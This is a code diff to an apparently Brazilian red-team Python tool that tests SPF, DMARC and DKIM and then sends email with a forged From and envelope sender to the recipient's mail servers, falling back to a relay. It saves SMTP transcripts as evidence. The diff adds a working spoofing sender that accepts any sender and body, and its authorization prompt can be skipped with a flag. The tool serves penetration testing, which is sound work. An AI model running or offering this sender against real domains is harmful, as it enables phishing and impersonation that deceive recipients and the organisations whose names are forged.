@@ -9,8 +9,10 @@ Uso de red team autorizado (RoE assinado). Console PT-BR; campos de evidência
 em EN (padrão deliverable do suite).
 """
 import argparse
+import datetime
 import email.message
 import email.utils
+import json
 import os
 import smtplib
 import sys
@@ -145,3 +147,147 @@ def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_byte
                 pass
         return {"method": "relay", "mx_used": host, "accepted": False,
                 "transcript": transcript, "error": str(e)}
+
+
+def roe_gate(forged_from, to_addr, method, assume_yes=False, interactive=None):
+    """Confirma autorização antes de enviar. Falha segura se sem consentimento."""
+    if interactive is None:
+        interactive = sys.stdin.isatty()
+    print("\n  [RoE] ENVIO DE EMAIL FORJADO — uso autorizado apenas")
+    print(f"        Remetente forjado : {forged_from}")
+    print(f"        Destinatário      : {to_addr}")
+    print(f"        Método            : {method}")
+    if assume_yes:
+        return True
+    if not interactive:
+        print("  [RoE] Sem confirmação e sem terminal interativo — abortando envio.")
+        return False
+    try:
+        ans = input("  [RoE] Digite SIM para confirmar a autorização: ")
+    except EOFError:
+        return False
+    return ans.strip() == "SIM"
+
+
+def write_evidence(outdir, domain, records, verdict, send):
+    """Grava spoof_evidence.json e (se houve envio) smtp_transcript.txt."""
+    os.makedirs(outdir, exist_ok=True)
+    evidence = {
+        "domain": domain,
+        "timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
+        "dns_records": records,
+        "verdict": verdict,
+    }
+    if send is not None:
+        transcript = send.get("transcript", [])
+        evidence["send"] = {k: v for k, v in send.items() if k != "transcript"}
+        evidence["send"]["smtp_transcript"] = transcript
+        with open(os.path.join(outdir, "smtp_transcript.txt"), "w") as f:
+            f.write("\n".join(transcript) + "\n")
+    with open(os.path.join(outdir, "spoof_evidence.json"), "w") as f:
+        json.dump(evidence, f, ensure_ascii=False, indent=2)
+    return evidence
+
+
+def _default_outdir(domain):
+    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+    return f"spoof_poc_{domain}_{ts}"
+
+
+def parse_args(argv=None):
+    p = argparse.ArgumentParser(description="Evidência de exploração de SPF/DMARC/DKIM (red team autorizado).")
+    p.add_argument("domain", help="Domínio alvo (domínio forjado em From:/MAIL FROM)")
+    p.add_argument("--dry-run", action="store_true", help="Mostra o envelope/headers sem enviar")
+    p.add_argument("--send", action="store_true", help="Ativa entrega forjada (opt-in, exige RoE)")
+    p.add_argument("--to", help="Destinatário (obrigatório com --send)")
+    p.add_argument("--from", dest="from_addr", help="Remetente forjado (default: security-test@<domain>)")
+    p.add_argument("--subject", default="[AUTHORIZED SECURITY TEST] Email spoofing PoC")
+    p.add_argument("--body", default="This is an authorized email spoofing proof-of-concept. No action required.")
+    p.add_argument("--body-file", help="Lê o corpo de um arquivo")
+    p.add_argument("--smtp", help="Relay de fallback HOST[:PORT]")
+    p.add_argument("--smtp-user")
+    p.add_argument("--smtp-pass")
+    p.add_argument("--helo", default=None, help="Nome no EHLO/HELO (default: hostname local)")
+    p.add_argument("--roe-accept", action="store_true", help="Confirma autorização sem prompt")
+    p.add_argument("--no-roe", action="store_true", help="Pula o prompt RoE (CI)")
+    p.add_argument("--outdir", default=None)
+    return p.parse_args(argv)
+
+
+def main(argv=None):
+    import socket
+    from email_security import analyze
+
+    args = parse_args(argv)
+    domain = args.domain
+    forged_from = args.from_addr or f"security-test@{domain}"
+    outdir = args.outdir or _default_outdir(domain)
+
+    print(f"  [*] Analisando autenticação de email de {domain} ...")
+    records = analyze(domain)
+    verdict = compute_verdict(records, forged_from)
+
+    print(f"  [=] SPF: {records['spf']['status']} | DMARC: {records['dmarc']['status']} | DKIM: {records['dkim']['status']}")
+    print(f"  [VERDITO] {verdict['status']} — {verdict['impact_en']}")
+    if verdict["spf_note_en"]:
+        print(f"            SPF: {verdict['spf_note_en']}")
+    print(f"  [envelope] MAIL FROM:<{forged_from}>  From: {forged_from}")
+
+    send = None
+    if args.send or args.dry_run:
+        if not args.to:
+            print("  [!] --to é obrigatório com --send/--dry-run.")
+            return 2
+        body = args.body
+        if args.body_file:
+            with open(args.body_file) as f:
+                body = f.read()
+        msg, msg_id = build_message(forged_from, args.to, args.subject, body)
+        helo = args.helo or socket.getfqdn()
+
+        if args.dry_run:
+            print("\n  [DRY-RUN] Mensagem que SERIA enviada:")
+            print("  " + "\n  ".join(msg.as_string().splitlines()))
+            write_evidence(outdir, domain, records, verdict, None)
+            print(f"\n  [✓] Evidência analítica em {outdir}/spoof_evidence.json")
+            return 0
+
+        method_desc = "direct-MX" + (" (fallback relay)" if args.smtp else "")
+        if not roe_gate(forged_from, args.to, method_desc,
+                        assume_yes=args.roe_accept or args.no_roe):
+            return 1
+
+        from email_security import dig
+        recipient_domain = args.to.split("@", 1)[1]
+        mx_hosts = parse_mx(dig("MX", recipient_domain))
+        msg_bytes = msg.as_bytes()
+
+        result = {"accepted": False, "transcript": ["sem MX resolvido"]}
+        if mx_hosts:
+            result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
+        if not result["accepted"] and args.smtp:
+            print("  [→] Entrega direta falhou — tentando relay configurado ...")
+            host, _, port = args.smtp.partition(":")
+            result = deliver_relay(host, int(port) if port else 587,
+                                   args.smtp_user, args.smtp_pass, helo,
+                                   forged_from, args.to, msg_bytes)
+
+        send = {
+            "recipient": args.to,
+            "forged_from": forged_from,
+            "mx_used": result.get("mx_used"),
+            "delivery_method": result.get("method", "direct"),
+            "message_id": msg_id,
+            "accepted": result["accepted"],
+            "transcript": result["transcript"],
+        }
+        status = "ACEITO (250)" if result["accepted"] else "REJEITADO/FALHOU"
+        print(f"  [SMTP] {status} via {send['delivery_method']} (mx={send['mx_used']})")
+
+    write_evidence(outdir, domain, records, verdict, send)
+    print(f"  [✓] Evidência em {outdir}/spoof_evidence.json")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
